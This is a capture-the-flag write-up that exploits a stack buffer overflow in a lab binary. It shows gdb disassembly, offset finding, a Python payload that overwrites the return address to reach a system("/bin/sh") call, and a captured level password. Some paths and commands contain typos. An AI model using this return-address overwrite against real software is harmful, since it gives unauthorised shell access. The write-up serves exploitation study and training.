# Level 0

## First clue
- once logged in as level1 a simple `ls -la`reveals the existence of a `level1` file, owned by `level2`:
- `level2` is an executable
- we try to execute it without arguments and we get the prompt back
- nothing happens if we write something

## Inspect with gdb
- we check the functions in the executable. the presence of gets() function reveals a potential vulnerability (`fget()` is more safe)
```
(gdb) info function
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main

```
- there are two main functions, `main` and `run`
- first we inspect main
## Main
```
  (gdb) disas main
  Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump.

```
- <+6> is substracting 80 bytes from the register `esp`, that is the variable that the CPU uses to keep track of the last procedure executed. This instruction allocate 80 bytes in the stack for a variable
- <+16> is calling the `gets()` function using as argument the buffer of which the address has been pushed onto the stack in the previous instruction (+13), as usual just before the calling of a function
- <+21> and <+22> restore the control flow back to the runtime where the main function had been called, effectively updating the instruction pointer (eip) with the address stored in the return address located in the stack frame.
- the return is where we can operate, because we want to overwrite the return address (stored in `eip`) taking advantage of the fct that the gets() function doesnt't check the length of the buffer and if we write in the buffer a number of bytes higher than what the program has allocate we can rite directly in the `eip`
- to do that we need 2 things: 
    1. know exactly the offset of the buffer (we know that 80 bytes has been allocated but not exactly the offset). 
    2. which payload to execute and how. sure we need to find a way to execute `cat /user/level2/home/.pass` as `level2`but how?
- to get the offset 
    1. we create a pattern of 80 characters (the same number of bytes allocated being 1 char = 1 byte) and save it i na file in the only place where we can save data: `python -c'print"a"*81' > /tmp/pattern`
    2. we pass this pattern as argument of ./level1 using gdb: 
    ``` 
    gdb ./level1
    run < /temp/pattern
    ```
    and we get the address returned by the program causing the segfault:
    ```
    Starting program: /home/user/level1/level1 </tmp/pattern

    Program received signal SIGSEGV, Segmentation fault.
    0x61616161 in ?? ()
    ```
    - since 61 is the ASCII for the character "a" we can constate that the address contains actually 4 "a" characters, that means that 80 - 4 = the exact point where the buffer is overflowed = 76
    - to confirm that we use the `info registers` gdb command:
    ```
    (gdb) info registers
    eax            0xbffff6e0	-1073744160
    ecx            0xb7fd28c4	-1208145724
    edx            0xbffff6e0	-1073744160
    ebx            0xb7fd0ff4	-1208152076
    esp            0xbffff730	0xbffff730
    ebp            0x61616161	0x61616161
    esi            0x0	0
    edi            0x0	0
    eip            0x61616161	0x61616161
    eflags         0x210286	[ PF SF IF RF ID ]
    cs             0x73	115
    ss             0x7b	123
    ds             0x7b	123
    es             0x7b	123
    fs             0x0	0
    gs             0x33	51
    ```
## Run
- we inspect the run function
```
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave  
   0x0804847f <+59>:	ret    
End of assembler dump.
```
- <+41>, <+46>, and <+53> are the most critical instructions within the run function. The fwrite function writes data to a file stream, and the subsequent system call indicates the execution of a shell command. But what shell command is being executed? To determine this, we inspect the argument passed to the system function:
    ```
    (gdb) x/s 0x8048584
    0x8048584:	 "/bin/sh"
    ```
- and we find out that the shell command is the shell executable
- ok so if we pass the address where the run function start as return of the main function we can actually execute /bin/sh 

### Buffer overflow return overwriting:
- we get the run function start address from the `info function` or `disas run` cmd output: `0x08048444  run`
- we create a file containing 76 char + the address of run function reversing it (for little endian):
`python -c 'print"a"*76+"\x44\x84\x04\x08"' > /tmp/exploit`
- we pass the `exploit` file as argument to `./level1`and we get a response `Good... Wait what?`but after that a segfault.
- we have to find a way to keep the stdin open after cat reads from the file, ensuring the program doesn't crash when system tries to read from it: `cat /tmp/exploit - | ./level`
## Solution
- this way the prompt is returned to us and we can try to cat the .pass of level2:
```
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```